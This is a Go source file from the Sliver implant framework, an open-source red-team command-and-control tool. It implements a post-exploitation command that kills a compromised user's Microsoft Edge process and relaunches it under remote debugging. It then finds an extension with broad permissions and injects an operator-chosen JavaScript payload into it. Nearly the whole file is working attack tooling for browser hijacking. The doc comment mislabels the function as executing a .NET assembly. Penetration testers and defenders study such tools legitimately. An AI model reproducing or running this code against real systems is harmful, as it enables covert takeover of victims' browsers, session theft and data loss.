package cursed

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"io/ioutil"
	"strings"

	"github.com/AlecAivazis/survey/v2"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/overlord"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/desertbit/grumble"
)

// CursedChromeCmd - Execute a .NET assembly in-memory
func CursedEdgeCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}

	payloadPath := ctx.Flags.String("payload")
	var payload []byte
	var err error
	if payloadPath != "" {
		payload, err = ioutil.ReadFile(payloadPath)
		if err != nil {
			con.PrintErrorf("Could not read payload file: %s\n", err)
			return
		}
	}

	curse := avadaKedavraEdge(session, ctx, con)
	if curse == nil {
		return
	}
	if payloadPath == "" {
		con.PrintWarnf("No Cursed Edge payload was specified, skipping payload injection.\n")
		return
	}

	con.PrintInfof("Searching for Edge extension with all permissions ... ")
	chromeExt, err := overlord.FindExtensionWithPermissions(curse, cursedChromePermissions)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	// There is one alternative set of permissions that we can use if we don't find an extension
	// with all the proper permissions.
	if chromeExt == nil {
		chromeExt, err = overlord.FindExtensionWithPermissions(curse, cursedChromePermissionsAlt)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
	}
	if chromeExt != nil {
		con.Printf("success!\n")
		con.PrintInfof("Found viable Edge extension %s%s%s (%s)\n", console.Bold, chromeExt.Title, console.Normal, chromeExt.ID)
		con.PrintInfof("Injecting payload ... ")
		ctx, _, _ := overlord.GetChromeContext(chromeExt.WebSocketDebuggerURL, curse)
		// extCtxTimeout, cancel := context.WithTimeout(ctx, 10*time.Second)
		// defer cancel()
		_, err = overlord.ExecuteJS(ctx, chromeExt.WebSocketDebuggerURL, chromeExt.ID, string(payload))
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
		con.Printf("success!\n")
	} else {
		con.Printf("failure!\n")
		con.PrintInfof("No viable Edge extensions were found ☹️\n")
	}
}

func avadaKedavraEdge(session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) *core.CursedProcess {
	edgeProcess, err := getEdgeProcess(session, ctx, con)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return nil
	}
	if edgeProcess != nil {
		con.PrintWarnf("Found running Edge process: %d (ppid: %d)\n", edgeProcess.GetPid(), edgeProcess.GetPpid())
		con.PrintWarnf("Sliver will need to kill and restart the Edge process in order to perform code injection.\n")
		con.PrintWarnf("Sliver will attempt to restore the user's session, however %sDATA LOSS MAY OCCUR!%s\n", console.Bold, console.Normal)
		con.Printf("\n")
		confirm := false
		err = survey.AskOne(&survey.Confirm{Message: "Kill and restore existing Edge process?"}, &confirm)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return nil
		}
		if !confirm {
			con.PrintErrorf("User cancel\n")
			return nil
		}
		terminateResp, err := con.Rpc.Terminate(context.Background(), &sliverpb.TerminateReq{
			Request: con.ActiveTarget.Request(ctx),
			Pid:     edgeProcess.GetPid(),
		})
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return nil
		}
		if terminateResp.Response != nil && terminateResp.Response.Err != "" {
			con.PrintErrorf("could not terminate the existing process: %s\n", terminateResp.Response.Err)
			return nil
		}
	}
	curse, err := startCursedChromeProcess(true, session, ctx, con)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return nil
	}
	return curse
}

func isEdgeProcess(executable string) bool {
	var edgeProcessNames = []string{
		"msedge",         // Linux
		"microsoft-edge", // Linux
		"msedge.exe",     // Windows
		"Microsoft Edge", // Darwin
	}
	for _, suffix := range edgeProcessNames {
		if strings.HasSuffix(executable, suffix) {
			return true
		}
	}
	return false
}

func getEdgeProcess(session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (*commonpb.Process, error) {
	ps, err := con.Rpc.Ps(context.Background(), &sliverpb.PsReq{
		Request: con.ActiveTarget.Request(ctx),
	})
	if err != nil {
		return nil, err
	}
	for _, process := range ps.Processes {
		if process.GetOwner() != session.GetUsername() {
			continue
		}
		if isEdgeProcess(process.GetExecutable()) {
			return process, nil
		}
	}
	return nil, nil
}
